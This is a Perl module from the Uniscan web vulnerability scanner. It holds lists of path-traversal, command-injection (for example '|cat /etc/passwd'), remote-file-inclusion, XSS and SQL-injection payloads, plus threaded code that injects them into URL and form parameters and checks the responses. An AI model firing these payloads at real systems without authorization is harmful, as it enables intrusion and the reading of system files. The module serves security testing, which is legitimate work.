package Uniscan::Scan;

use Moose;
use Uniscan::Configure;
use Uniscan::Http;
use Uniscan::Functions;

our %conf = ( );
our $c = Uniscan::Configure->new(conffile => "uniscan.conf");
%conf = $c->loadconf();
our $vulnerable :shared = 0;
our $func = Uniscan::Functions->new();
our $q :shared = 0;
our $http = Uniscan::Http->new();

our @RFI = (
		'http://www.uniscan.com.br/c.txt?',
		'http://www.uniscan.com.br/c.txt?%00'
	);

our @LFI = (
		'../../../../../../../../../../etc/passwd%00',
		'../../../../../../../../../../etc/passwd%00.jpg',
		'../../../../../../../../../../etc/passwd%00.html',
		'../../../../../../../../../../etc/passwd%00.css',
		'../../../../../../../../../../etc/passwd%00.php',
		'../../../../../../../../../../etc/passwd%00.txt',
		'../../../../../../../../../../etc/passwd%00.inc',
		'../../../../../../../../../../etc/passwd%00.png',
		'../../../../../../../../../../etc/passwd',
		'//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd',
		'//../../../../../../../../etc/passwd',
		'//../../../../../../../../etc/passwd%00',
		'//../../../../../../../../etc/passwd%00en',
		'//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
		'//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
		'//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
		'//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd',
		'//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
		'//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd',
		'//....................etc/passwd',
		'//..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255..%255..%255cetc/passwd',
		'//%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd',
		'//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd',
		'//%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252eetc/passwd',
		'../..//../..//../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd',
		'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.',
		'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd',
		'/\\../\\../\\../\\../\\../\\../\\../\\../\\../\\../\\../etc/passwd',
		'/../..//../..//../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd%00',
		'.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd',
		'../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd',
		'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd',
		'..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
		'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00',
		'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.jpg',
		'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.html',
		'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.css',
		'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.php',
		'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.txt',
		'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.inc',
		'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.png',
		'..\..\..\..\..\..\..\..\..\..\..\boot.ini',
		'c:\boot.ini',
		'c:\boot.ini%00'
		);

our @RCE = (
		'|cat%20/etc/passwd',
		'|cat%20/etc/passwd|',
		'|cat%20/etc/passwd%00|',
		'|cat%20/etc/passwd%00.html|',
		'|cat%20/etc/passwd%00.htm|',
		'|cat%20/etc/passwd%00.dat|',
		'system("cat%20/etc/passwd");',
		'.system("cat%20/etc/passwd").',
		':system("cat%20/etc/passwd");',
		';system("cat%20/etc/passwd").',
		';system("cat%20/etc/passwd")',
		';system("cat%20/etc/passwd");',
		':system("cat%20/etc/passwd").',
		'`cat%20/etc/passwd`',
		'`cat%20/etc/passwd`;',
		';cat%20/etc/passwd;',
		'|type%20c:\boot.ini',
		'|type%20c:\boot.ini|',
		'|type%20c:\boot.ini%00|',
		'|type%20c:\boot.ini%00.html|',
		'|type%20c:\boot.ini%00.htm|',
		'|type%20c:\boot.ini%00.dat|',
		'system("type%20c:\boot.ini");',
		'.system("type%20c:\boot.ini").',
		':system("type%20c:\boot.ini");',
		';system("type%20c:\boot.ini").',
		';system("type%20c:\boot.ini")',
		';system("type%20c:\boot.ini");',
		':system("type%20c:\boot.ini").',
		'`type%20c:\boot.ini`',
		'`type%20c:\boot.ini`;',
		';type%20c:\boot.ini;'
);


our @XSS = (
		"\"><script>alert('XSS')</script>",
		"<script>alert('XSS')</script>",
		"'';!--\"<XSS>=&{()}",
		"\">'';!--\"<XSS>=&{()}",
		"<IMG SRC=\"javascript:alert('XSS');\">",
		"\"><IMG SRC=\"javascript:alert('XSS');\">",
		"<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
		"\"><IMG SRC=javascript:alert(&quot;XSS&quot;)>",
		"<IMG SRC=\"javascript:alert('XSS')\"",
		"\"><IMG SRC=\"javascript:alert('XSS')\"",
		"<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
		"\"><LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
		"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
		"\"><META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
		"<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
		"\"><DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
		"<body onload=\"javascript:alert('XSS')\"></body>",
		"\"><body onload=\"javascript:alert('XSS')\"></body>",
		"<table background=\"javascript:alert('XSS')\"></table>",
		"\"><table background=\"javascript:alert('XSS')\"></table>",
	);



our @SQL = (
		'%27',
		'%3b',
		'%22',
		"'",
		";",
		"\""
	);




##############################################
#  Function CheckPut
#  this function check if PUT method is enabled 
#
#
#  Param: $url
#  Return: nothing
##############################################

sub CheckPut(){
	my ($self, $url) = @_;
	my $h = Uniscan::Http->new();
	my $resp = $h->PUT($url."uniscan.txt", "uniscan123 uniscan123");
	$resp = $h->GET($url."uniscan.txt");
	if($resp =~/uniscan123/){
		$vulnerable++;
		$func->write("="x100);
		$func->write("| PUT method is enabled");
		$func->write("| [+] Vul[$vulnerable]: PUT /uniscan.txt");
		$func->write("="x100);
	}
}



##############################################
#  Function CheckBackupFiles
#  this function check if exist backup files on 
#  http server
#
#  Param: @files
#  Return: nothing
##############################################


sub CheckBackupFiles(){
	my ($self, @files) = @_;
	my @backup = (	'.bak',
			'.bkp',
			'~',
			'.old',
			'.cpy',
			'.rar',
			'.zip',
			'.tar',
			'.tgz',
			'.gz',
			'.txt',
			'.log',
			'.bck',
			'.tar.gz'
		    );
	my %bkp = ();
	my @file = ();
	my $url = "";
	foreach my $f (@files){
		chomp($f);
		$url = $func->get_url($f);
		my $fi = $func->get_file($f);
		substr($fi, length($fi)-1, length($fi)) = "" if(substr($fi, length($fi)-1, length($fi)) eq "/");
		foreach my $b (@backup){
			my $fil = $fi . $b;
			if(!$bkp{$fil}){
				push(@file, $fil) if($fil =~/\//);
				$bkp{$fil} = 1;
			}
			
		}
	}
	%bkp = ();
	@files = ();
	open(my $f, ">>temp.txt") or die "$!\n";
	foreach my $file (@file){      
	      print $f "$file\n";
	}
	close($f);
	@file= ();
	$func->write("| Checking for backup files:");
	$func->Check($url, "temp.txt");
	open($f, ">temp.txt");
	print $f "";
	close($f);

}


##############################################
#  Function ScanRFICrawler
#  this function check RFI Vulnerabilities 
#
#
#  Param: @urls
#  Return: nothing
##############################################

sub ScanRFICrawler(){
	my ($self, @urls) = @_;
	my @tests = &GenerateTests("RFI", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestRFI", @tests) if(scalar(@tests));
}



##############################################
#  Function ScanRFICrawlerPost
#  this function check RFI Vulnerabilities 
#  on forms
#
#  Param: @urls
#  Return: nothing
##############################################


sub ScanRFICrawlerPost(){
	my ($self, @urls) = @_;
	my @tests = &GenerateTestsPost("RFI", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestRFIPost", @tests) if(scalar(@tests));
}



##############################################
#  Function ScanXSSCrawler
#  this function check XSS Vulnerabilities 
#
#
#  Param: @urls
#  Return: nothing
##############################################


sub ScanXSSCrawler(){
	my ($self, @urls) = @_;
	my @tests = &GenerateTests("XSS", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestXSS", @tests) if(scalar(@tests));
}


##############################################
#  Function ScanXSSCrawlerPost
#  this function check XSS Vulnerabilities 
#  on forms
#
#  Param: @urls
#  Return: nothing
##############################################


sub ScanXSSCrawlerPost(){
	my ($self, @urls) = @_;
	my @tests = &GenerateTestsPost("XSS", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestXSSPost", @tests) if(scalar(@tests));
}



##############################################
#  Function ScanLFICrawler
#  this function check LFI Vulnerabilities 
#
#
#  Param: @urls
#  Return: nothing
##############################################


sub ScanLFICrawler(){
	my ($self, @urls) = @_;
	my @tests = &GenerateTests("LFI", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestLFI", @tests) if(scalar(@tests));
}


##############################################
#  Function ScanLFICrawlerPost
#  this function check LFI Vulnerabilities 
#  on forms
#
#  Param: @urls
#  Return: nothing
##############################################

sub ScanLFICrawlerPost(){
	my ($self, @urls) = @_;
	my @tests = &GenerateTestsPost("LFI", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestLFIPost", @tests) if(scalar(@tests));
}




##############################################
#  Function ScanRCECrawler
#  this function check RCE Vulnerabilities 
#
#
#  Param: @urls
#  Return: nothing
##############################################

sub ScanRCECrawler(){
	my ($self, @urls) = @_;
	my @tests = &GenerateTests("RCE", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestRCE", @tests) if(scalar(@tests));
}



##############################################
#  Function ScanRCECrawlerPost
#  this function check RCE Vulnerabilities 
#  on forms
#
#  Param: @urls
#  Return: nothing
##############################################

sub ScanRCECrawlerPost(){
	my ($self, @urls) = @_;
	my @tests = &GenerateTestsPost("RCE", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestRCEPost", @tests) if(scalar(@tests));
}


##############################################
#  Function ScanSQLCrawler
#  this function check SQL-injection Vulnerabilities 
#
#
#  Param: @urls
#  Return: nothing
##############################################


sub ScanSQLCrawler(){
	my ($self, @urls) = @_;
	my @tests = &GenerateTestsSql("SQL", @urls) if(scalar(@urls));
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestSQL", @tests) if(scalar(@tests));
	@urls = $func->remove(@urls) if(scalar(@urls));
	&threadnize("CheckNoError", @urls) if(scalar(@urls));
}




##############################################
#  Function ScanSQLCrawlerPost
#  this function check SQL Vulnerabilities 
#  on forms
#
#  Param: @urls
#  Return: nothing
##############################################

sub ScanSQLCrawlerPost(){
	my ($self, @urls) = @_;
	my @tests = &GenerateTestsPostSql("SQL", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestSQLPost", @tests) if(scalar(@tests));
}





##############################################
#  Function TestRFI
#  this function test RFI Vulnerabilities 
#
#
#  Param: $test
#  Return: nothing
##############################################

sub TestRFI(){

my ($resp, $test) = 0;

	while($q->pending){
		$test = $q->dequeue;
		my $t = $test;

		if(length($t) >70){
			$t = substr($t, 0, 70);
			$t .= "...";
		}
		else{
			$t .= " "x(99 - length($t)); 
		}
		print "[*] Checking: $t\r";
		
		$resp = $http->GET($test);
		if($resp =~/$conf{'rfi_return'}/){
			$vulnerable++;
			$func->write("| [+] Vul[$vulnerable] [RFI] $test");
		}
		$resp = 0;
	}
}


##############################################
#  Function TestRFIPost
#  this function test RFI Vulnerabilities 
#  on forms
#
#  Param: $test
#  Return: nothing
##############################################

sub TestRFIPost(){

my ($resp, $test) = 0;
	while($q->pending){
		$test = $q->dequeue;
		my ($url, $data) = split('#', $test);
		my $t = $url;
		if(length($t) >70){
			$t = substr($t, 0, 70);
			$t .= "...";
		}
		else{
			$t .= " "x(99 - length($t)); 
		}
		print "[*] Checking: $t\r";
		$resp = $http->POST($url, $data);
		if($resp =~/$conf{'rfi_return'}/){
			$vulnerable++;
			$func->write("| [+] Vul[$vulnerable] [RFI] $url\n| Post data: $data");
		}
		$resp = 0;
	}
}

##############################################
#  Function TestLFI
#  this function test LFI Vulnerabilities 
#
#
#  Param: $test
#  Return: nothing
##############################################

sub TestLFI(){

my ($resp, $test) = 0;
	while($q->pending){
		$test = $q->dequeue;
		my $t = $test;
		if(length($t) >70){
			$t = substr($t, 0, 70);
			$t .= "...";
		}
		else{
			$t .= " "x(99 - length($t)); 
		}
		print "[*] Checking: $t\r";
		$resp = $http->GET($test);
		if($resp =~/root:x:0:0:root/ || ($resp =~/boot loader/ && $resp =~/operating systems/ && $resp =~/WINDOWS/)){
			$vulnerable++;
			$func->write("| [+] Vul[$vulnerable] [LFI] $test");
		}
		$resp = 0;
	}
}

##############################################
#  Function TestLFIPost
#  this function test LFI Vulnerabilities 
#  on forms
#
#  Param: $test
#  Return: nothing
##############################################

sub TestLFIPost(){
	while($q->pending){
		my $test = $q->dequeue;
		my ($url, $data) = split('#', $test);
		my $t = $url;
		if(length($t) >70){
			$t = substr($t, 0, 70);
			$t .= "...";
		}
		else{
			$t .= " "x(99 - length($t)); 
		}
		print "[*] Checking: $t\r";
	
		my $resp = $http->POST($url, $data);
		if($resp =~/root:x:0:0:root/ || ($resp =~/boot loader/ && $resp =~/operating systems/ && $resp =~/WINDOWS/)){
			$vulnerable++;
			$func->write("| [+] Vul[$vulnerable] [LFI] $url\n| Post data: $data");
		}
		$resp = 0;
	}
}

##############################################
#  Function TestRCE
#  this function test RCE Vulnerabilities 
#
#
#  Param: $test
#  Return: nothing
##############################################

sub TestRCE(){
	while($q->pending){
		my $test = $q->dequeue;
		my $t = $test;
		if(length($t) >70){
			$t = substr($t, 0, 70);
			$t .= "...";
		}
		else{
			$t .= " "x(99 - length($t)); 
		}
		print "[*] Checking: $t\r";
		my $resp = $http->GET($test);
		if($resp =~/root:x:0:0:root/ || ($resp =~/boot loader/ && $resp =~/operating systems/ && $resp =~/WINDOWS/)){
			$vulnerable++;
			$func->write("| [+] Vul[$vulnerable] [RCE] $test");
		}
		$resp = 0;
	}
}

##############################################
#  Function TestRCEPost
#  this function test RCE Vulnerabilities 
#  on forms
#
#  Param: $test
#  Return: nothing
##############################################

sub TestRCEPost(){
	while($q->pending){
		my $test = $q->dequeue;
		my ($url, $data) = split('#', $test);
		my $t = $url;
		if(length($t) >70){
			$t = substr($t, 0, 70);
			$t .= "...";
		}
		else{
			$t .= " "x(99 - length($t)); 
		}
		print "[*] Checking: $t\r";
		my $resp = $http->POST($url, $data);
		if($resp =~/root:x:0:0:root/ || ($resp =~/boot loader/ && $resp =~/operating systems/ && $resp =~/WINDOWS/)){
			$vulnerable++;
			$func->write("| [+] Vul[$vulnerable] [RCE] $url\n| Post data: $data");
		}
		$resp = 0;
	}
}


##############################################
#  Function TestXSS
#  this function test XSS Vulnerabilities 
#
#
#  Param: $test
#  Return: nothing
##############################################

sub TestXSS(){
	while($q->pending){
		my $test = $q->dequeue;
		my $t = $test;
		if(length($t) >70){
			$t = substr($t, 0, 70);
			$t .= "...";
		}
		else{
			$t .= " "x(99 - length($t)); 
		}
		print "[*] Checking: $t\r";
		my $resp = $http->GET($test);
		if($resp =~ m/<[\w|\s|\t|\n|\r|'|"|\?|\[|\]|\(|\)|\*|&|%|\$|#|@|!|\|\/|,|\.|;|:|\^|~|\}|\{|\+|\-|=|_]+>[_|=|\w|\s|\t|\n|\r|'|"|\?|\[|\]|\(|\)|\*|&|%|\$|#|@|!|\|\/|,|\.|;|:|\^|~|\}|\{|\+|\-]*(<script>alert\('XSS'\)<\/script>|<XSS>|<IMG SRC=\"javascript:alert\('XSS'\);\">|<IMG SRC=javascript:alert\(&quot;XSS&quot;\)>|<IMG SRC=javascript:alert\(String.fromCharCode\(88,83,83\)\)>|<IMG SRC=javascript:alert('XSS')>|<IMG SRC=\"javascript:alert\('XSS'\)\">|<LINK REL=\"stylesheet\" HREF=\"javascript:alert\('XSS'\);\">|<IMG SRC='vbscript:msgbox\(\"XSS\"\)'>|<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http:\/\/;URL=javascript:alert\('XSS'\);\">|<DIV STYLE=\"background-image: url\(javascript:alert\('XSS'\)\)\">|<body onload=\"javascript:alert\('XSS'\)\"><\/body>|<table background=\"javascript:alert\('XSS'\)\"><\/table>).*</i){
			$vulnerable++;
			$func->write("| [+] Vul[$vulnerable] [XSS] $test");
		}
		$resp = 0;
	}
}


##############################################
#  Function TestXSSPost
#  this function test XSS Vulnerabilities 
#  on forms
#
#  Param: $test
#  Return: nothing
##############################################

sub TestXSSPost(){
	while($q->pending){
		my $test = $q->dequeue;
		my ($url, $data) = split('#', $test);
		my $t = $url;
		if(length($t) >70){
			$t = substr($t, 0, 70);
			$t .= "...";
		}
		else{
			$t .= " "x(99 - length($t)); 
		}
		print "[*] Checking: $t\r";

		my $resp = $http->POST($url, $data);
		if($resp =~ m/<[\w|\s|\t|\n|\r|'|"|\?|\[|\]|\(|\)|\*|&|%|\$|#|@|!|\|\/|,|\.|;|:|\^|~|\}|\{|\+|\-|=|_]+>[_|=|\w|\s|\t|\n|\r|'|"|\?|\[|\]|\(|\)|\*|&|%|\$|#|@|!|\|\/|,|\.|;|:|\^|~|\}|\{|\+|\-]*(<script>alert\('XSS'\)<\/script>|<XSS>|<IMG SRC=\"javascript:alert\('XSS'\);\">|<IMG SRC=javascript:alert\(&quot;XSS&quot;\)>|<IMG SRC=javascript:alert\(String.fromCharCode\(88,83,83\)\)>|<IMG SRC=javascript:alert('XSS')>|<IMG SRC=\"javascript:alert\('XSS'\)\">|<LINK REL=\"stylesheet\" HREF=\"javascript:alert\('XSS'\);\">|<IMG SRC='vbscript:msgbox\(\"XSS\"\)'>|<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http:\/\/;URL=javascript:alert\('XSS'\);\">|<DIV STYLE=\"background-image: url\(javascript:alert\('XSS'\)\)\">|<body onload=\"javascript:alert\('XSS'\)\"><\/body>|<table background=\"javascript:alert\('XSS'\)\"><\/table>).*</i){
			$vulnerable++;
			$func->write("| [+] Vul[$vulnerable] [XSS] $url\n| Post data: $data");
		}
		$resp = 0;
	}
}


##############################################
#  Function TestSQL
#  this function test SQL Vulnerabilities 
#
#
#  Param: $test
#  Return: nothing
##############################################

sub TestSQL(){
	while($q->pending){
		my $test = $q->dequeue;
		my $t = $test;
		if(length($t) >70){
			$t = substr($t, 0, 70);
			$t .= "...";
		}
		else{
			$t .= " "x(99 - length($t)); 
		}
		print "[*] Checking: $t\r";
		my $resp = $http->GET($test);
		if($resp =~/You have an error in your SQL syntax|Microsoft OLE DB Provider for ODBC Drivers error|Supplied argument is not a valid .* result|Unclosed quotation mark after the character string/){
			$vulnerable++;
			$func->write("| [+] Vul[$vulnerable] [SQL-i] $test");
		}
		$resp = 0;
	}
}



##############################################
#  Function TestSQLPost
#  this function test SQL Vulnerabilities 
#  on forms
#
#  Param: $test
#  Return: nothing
##############################################

sub TestSQLPost(){
	while($q->pending){
		my $test = $q->dequeue;
		my ($url, $data) = split('#', $test);
		my $t = $url;
		if(length($t) >70){
			$t = substr($t, 0, 70);
			$t .= "...";
		}
		else{
			$t .= " "x(99 - length($t)); 
		}
		print "[*] Checking: $t\r";
		my $resp = $http->POST($url, $data);
		if($resp =~/You have an error in your SQL syntax|Microsoft OLE DB Provider for ODBC Drivers error|Supplied argument is not a valid .* result|Unclosed quotation mark after the character string/){
			$vulnerable++;
			$func->write("| [+] Vul[$vulnerable] [SQL] $url\n| Post data: $data");
		}
		$resp = 0;
	}
}


##############################################
#  Function threadnize
#  this function threadnize any function in this
#  module
#
#  Param: $function, @tests
#  Return: nothing
##############################################


sub threadnize(){
	my ($fun, @tests) = @_;
	$q = 0;
	$q = new Thread::Queue;
	$tests[0] = 0;
	foreach my $test (@tests){
		$q->enqueue($test) if($test);
	}

	my $x=0;
	while($q->pending() && $x <= $conf{'max_threads'}-1){
		no strict 'refs';
		threads->new(\&{$fun});
		$x++;
	}

	my @threads = threads->list();
        foreach my $running (@threads) {
		$running->join();
        }
	@threads = ();
	$q = 0;
}



##############################################
#  Function GenerateTests
#  this function generate the tests
#
#
#  Param: $test, @list
#  Return: @list_of_tests
##############################################

sub GenerateTests(){
	my ($test, @list) = @_;
	my @list2 = ();
	foreach my $line (@list){
		$line =~ s/&amp;/&/g;
		$line =~ s/\[\]//g;
		if($line =~ /=/){
			my $temp = $line;
			$temp = substr($temp,index($temp, '?')+1,length($temp));
			my @variables = split('&', $temp);
			for(my $x=0; $x< scalar(@variables); $x++){
				my $var_temp = substr($variables[$x],0,index($variables[$x], '=')+1);
				no strict 'refs';
				if($var_temp){
					foreach my $str (@{$test}){
						$temp = $line;
						my $t = $var_temp . $str;
						$temp =~ s/\Q$variables[$x]\E/$t/g;
						push(@list2, $temp);
					}
				}
			}
		@variables = ();
		}
	}
	@list = ();
	return @list2;
}



##############################################
#  Function GenerateTestsPost
#  this function generate the tests for POST
#  method
#
#  Param: $test, @list
#  Return: @list_of_tests
##############################################

sub GenerateTestsPost(){
	my ($test, @list) = @_;
	my @list2 = ();
	foreach my $line (@list){
		my ($url, $line) = split('#', $line);
		$line =~ s/&amp;/&/g;
		$line =~ s/\[\]//g;
		if($line =~ /=/){
			my $temp = $line;
			$temp = substr($temp,index($temp, '?')+1,length($temp));
			my @variables = split('&', $temp);
			for(my $x=0; $x< scalar(@variables); $x++){
				my $var_temp = substr($variables[$x],0,index($variables[$x], '=')+1);
				no strict 'refs';
				if($var_temp){
					foreach my $str (@{$test}){
						$temp = $line;
						my $t = $var_temp . $str;
						$temp =~ s/\Q$variables[$x]\E/$t/g;
						push(@list2, $url . '#' .$temp);
					}
				}
			}
		}
	}
	@list = ();
	return @list2;
}



##############################################
#  Function GenerateTestsSql
#  this function generate the tests to check
#  SQL-injection Vulnerabilities
#
#  Param: $test, @list
#  Return: @list_of_tests
##############################################

sub GenerateTestsSql(){
	my ($test, @list) = @_;
	my @list2 = ();
	foreach my $line (@list){
		$line =~ s/&amp;/&/g;
		$line =~ s/\[\]//g;
		if($line =~ /=/){
			my $temp = $line;
			$temp = substr($temp,index($temp, '?')+1,length($temp));
			my @variables = split('&', $temp);
			for(my $x=0; $x< scalar(@variables); $x++){
				no strict 'refs';
				if($variables[$x]){
					foreach my $str (@{$test}){
						$temp = $line;
						my $t = $variables[$x] . $str;
						$temp =~ s/\Q$variables[$x]\E/$t/g;
						push(@list2, $temp);
					}
				}
			}
		}
	}
	@list = ();
	return @list2;
}


##############################################
#  Function GenerateTestsPostSql
#  this function generate the tests to check
#  SQL-injection Vulnerabilities for POST method
#
#  Param: $test, @list
#  Return: @list_of_tests
##############################################

sub GenerateTestsPostSql(){
	my ($test, @list) = @_;
	my @list2 = ();
	foreach my $line (@list){
		my ($url, $line) = split('#', $line);
		$line =~ s/&amp;/&/g;
		$line =~ s/\[\]//g;
		if($line =~ /=/){
			my $temp = $line;
			$temp = substr($temp,index($temp, '?')+1,length($temp));
			my @variables = split('&', $temp);
			for(my $x=0; $x< scalar(@variables); $x++){
				no strict 'refs';
				if($variables[$x]){
					foreach my $str (@{$test}){
						$temp = $line;
						my $t = $variables[$x] . $str;
						$temp =~ s/\Q$variables[$x]\E/$t/g;
						push(@list2, $url . '#' .$temp);
					}
				}
			}
		}
	}
	@list = ();
	return @list2;
}


##############################################
#  Function CheckNoError
#  this function check SQL-injection Vulnerabilities
#  no error based
#
#  Param: $url
#  Return: nothing
##############################################

sub CheckNoError(){
	while($q->pending){
		my $url = $q->dequeue;
		my $t = $url;

		if(length($t) >70){
			$t = substr($t, 0, 70);
			$t .= "...";
		}
		else{
			$t .= " "x(73 - length($t)); 
		}
		print "[*] Checking: $t\r";
		if($url =~/\?/){
			my ($url1, $vars) = split('\?', $url);
			my @var = split('&', $vars);
			foreach my $v (@var){
				TestNoError($url, $v);
			
			}
	      }
	}
}


##############################################
#  Function TestNoError
#  this function test SQL-injection Vulnerabilities
#  no error based
#
#  Param: $url, $variable
#  Return: nothing
##############################################

sub TestNoError(){
	my ($url, $var) = @_;


	my $url1 = $url;
	$url1 =~ s/$var/$var\+AND\+1=1/g;
	my $url2 = $url;
	$url2 =~ s/$var/$var\+AND\+1=2/g;


	my $r1 = $http->GET($url);
	my $r2 = $http->GET($url);



	my $r4 = $http->GET($url2);
  
	my $r5 = $http->GET($url1);

	my @w1 = split(' ', $r1);

	my $keyword = "";
	my $key = 0;
	foreach my $word (@w1){
		if($r2 =~ m/\Q$word\E/ && $r4 !~m/\Q$word\E/ && length($word) > 5 && $word =~ m/^\w+$/g){
			if($key == 0){
				$key =1;
				$keyword = $word;
			}
		}
	}

	if($r5 =~/$keyword/ && $key == 1 && $r5 !~/<b>Warning<\/b>.+\[<a href='function/ && $r4 !~/\Q$keyword\E/){
		$vulnerable++;
		$func->write("| [+] Vul[$vulnerable] [Blind SQL-i]: $url1");
	}
	($r1, $r2, $r4, $r5, @w1, $keyword) = 0
}





sub ScanStaticRFI(){
	my ($self, $url) = @_;
	open(my $a, "<RFI") or die "$!\n";
	my @tests = <$a>;
	close($a);
	my @urls;
	foreach my $test (@tests){
		chomp $test;
		push(@urls, $url.$test);
	}
	&threadnize("TestRFI", @urls);
}

sub ScanStaticLFI(){
	my ($self, $url) = @_;
	open(my $a, "<LFI") or die "$!\n";
	my @tests = <$a>;
	close($a);
	my @urls;
	foreach my $test (@tests){
		chomp $test;
		push(@urls, $url.$test);
	}
	&threadnize("TestLFI", @urls);


}

sub ScanStaticRCE(){
	my ($self, $url) = @_;
	open(my $a, "<RCE") or die "$!\n";
	my @tests = <$a>;
	close($a);
	my @urls;
	foreach my $test (@tests){
		chomp $test;
		push(@urls, $url.$test);
	}
	&threadnize("TestRCE", @urls);


}


sub Clear(){
	my $self = shift;
	$vulnerable = 0;
}

1;
